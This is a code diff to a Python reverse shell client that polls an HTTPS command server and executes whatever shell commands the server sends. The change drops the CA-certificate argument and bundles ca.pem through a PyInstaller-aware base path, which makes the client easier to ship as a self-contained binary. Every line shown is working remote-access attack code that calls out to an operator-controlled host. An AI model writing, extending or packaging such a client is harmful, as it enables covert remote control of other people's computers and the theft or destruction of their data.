@@ -10,6 +10,7 @@ import os
 import platform
 import ssl
 import subprocess
+import sys
 from pathlib import Path
 from urllib import request, parse
 
@@ -61,25 +62,37 @@ class ClientCommands:
 
 
 class Client:
-    def __init__(self,
-                 server_address: str,
-                 server_port: int,
-                 ca_file: [str, Path]):
+    def __init__(self, server_address: str, server_port: int):
         """Create a Reverse Shell Client that receives commands from a
         server though HTTPS.
 
         :param server_address: Hostname or address of the server.
         :param server_port: Port number used by the server.
-        :param ca_file: Absolute path to a file containing the
-            certificate for the Certificate Authority (CA).
         """
 
-        self.server_url = f"https://{server_address}:{server_port}"
-        self.commands = ClientCommands(self)
-        self.ssl_context = ssl.create_default_context(
+        self.server_address = server_address
+        self.server_port = server_port
+        self._commands = ClientCommands(self)
+        self._ssl_context = ssl.create_default_context(
             purpose=ssl.Purpose.SERVER_AUTH,
-            cafile=str(ca_file)
+            cafile=str(self.base_path.joinpath("ca.pem"))
         )
+
+    @property
+    def base_path(self) -> Path:
+        """
+        Gets the absolute path for the directory of the current file.
+        """
+        try:
+            '''If the file is compiled as a binary by PyInstaller, its 
+            path will be set by sys._MEIPASS'''
+            return Path(sys._MEIPASS)
+        except AttributeError:
+            return Path(__file__).parent.absolute()
+
+    @property
+    def server_url(self) -> str:
+        return f"https://{self.server_address}:{self.server_port}"
 
     @property
     def _shell_prompt(self) -> str:
@@ -99,12 +112,12 @@ class Client:
         request_body: bytes = parse.urlencode(request_body).encode()
         url = request.Request(self.server_url, data=request_body)
         return (request
-                .urlopen(url=url, context=self.ssl_context)
+                .urlopen(url=url, context=self._ssl_context)
                 .read()
                 .decode())
 
     def execute(self) -> None:
-        self.commands.open_session()
+        self._commands.open_session()
         while True:
             try:
                 response: str = self.post({"prompt": self._shell_prompt})
@@ -115,9 +128,9 @@ class Client:
                 if len(cmd) == 0:    # cmd is an empty string
                     continue
                 else:                # cmd is a method of ClientCommands
-                    getattr(self.commands, cmd)(args)
+                    getattr(self._commands, cmd)(args)
             except AttributeError:   # cmd is a standard shell command
-                self.commands.shell(response)
+                self._commands.shell(response)
 
 
 if __name__ == "__main__":
@@ -133,16 +146,7 @@ if __name__ == "__main__":
                         required=True,
                         metavar="<port>",
                         help="Port number exposed by the server.")
-    parser.add_argument("--ca-cert",
-                        type=str,
-                        metavar="<path>",
-                        help="Absolute path to a file containing the "
-                             "certificate for the Certificate Authority (CA).")
 
     _args = parser.parse_args()
 
-    Client(
-        server_address=_args.host,
-        server_port=_args.port,
-        ca_file=_args.ca_cert
-    ).execute()
+    Client(server_address=_args.host, server_port=_args.port).execute()
